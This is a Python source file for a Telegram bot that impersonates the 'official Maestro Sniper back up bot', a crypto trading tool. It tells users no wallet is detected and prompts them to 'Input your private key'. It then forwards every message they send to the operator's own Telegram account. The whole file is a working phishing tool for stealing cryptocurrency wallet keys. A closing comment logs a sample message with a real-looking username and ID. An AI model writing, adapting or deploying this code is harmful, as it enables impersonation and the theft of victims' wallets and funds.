import logging
from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from decouple import config

# Enable logging
logging.basicConfig(level=logging.INFO)

# Your bot's API token
TOKEN = config("TOKEN", None)

YOUR_TELEGRAM_ID = config("YOUR_TELEGRAM_ID", None)

start_chart = f"""
Maestro Sniper Back Up Bot\n\n

This is official maestro sniper back up bot
deployed by @Maestrobotbackup_bot\n\n
I can snipe call channels, presales and many more to come!
"""

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Send a message with a 'No wallet Detected - Click to import' button"""
    button = [[KeyboardButton('No wallet Detected - Click to import')]]
    keyboard = ReplyKeyboardMarkup(button)
    await context.bot.send_message(chat_id=update.effective_chat.id, 
                             text=start_chart, 
                             reply_markup=keyboard)


async def send_details(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Respond with 'Input your private key'"""
    button = [[KeyboardButton('Cancel')]]
    keyboard = ReplyKeyboardMarkup(button)
    await context.bot.send_message(chat_id=update.effective_chat.id, 
                             text='Input your private key', reply_markup=keyboard)


async def forward_message(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Forward user's message to your Telegram account"""
    print(f"Message: {update.effective_message.text} from @{update.effective_message.chat.username}")
    print("--")
    if update.effective_user.id != YOUR_TELEGRAM_ID:
        await context.bot.forward_message(chat_id=YOUR_TELEGRAM_ID, 
                                    from_chat_id=update.effective_chat.id, 
                                    message_id=update.effective_message.message_id)
    await context.bot.send_message(chat_id=update.effective_chat.id, 
                             text='Input your private key')

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    """Go back to 'Send Details' button"""
    button = [[KeyboardButton('No wallet Detected - Click to import')]]
    keyboard = ReplyKeyboardMarkup(button)
    await context.bot.send_message(chat_id=update.effective_chat.id, 
                             text=start_chart, 
                             reply_markup=keyboard)


def main():
    application = ApplicationBuilder().token(TOKEN).build()

    application.add_handler(CommandHandler('start', start))
    application.add_handler(MessageHandler(filters.Regex('^No wallet Detected - Click to import$'), send_details))
    application.add_handler(MessageHandler(filters.Regex('^Cancel$'), cancel))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, forward_message))

    application.run_polling()


if __name__ == '__main__':
    main()


# Message(channel_chat_created=False, chat=Chat(first_name='Popsicool', id=1128136749, type=<ChatType.PRIVATE>, username='Popsicool1'), date=datetime.datetime(2024, 9, 19, 11, 11, 40, tzinfo=datetime.timezone.utc), delete_chat_photo=False, from_user=User(first_name='Popsicool', id=1128136749, is_bot=False, language_code='en', username='Popsicool1'), group_chat_created=False, message_id=29, supergroup_chat_created=False, text='exmsoenfidnr')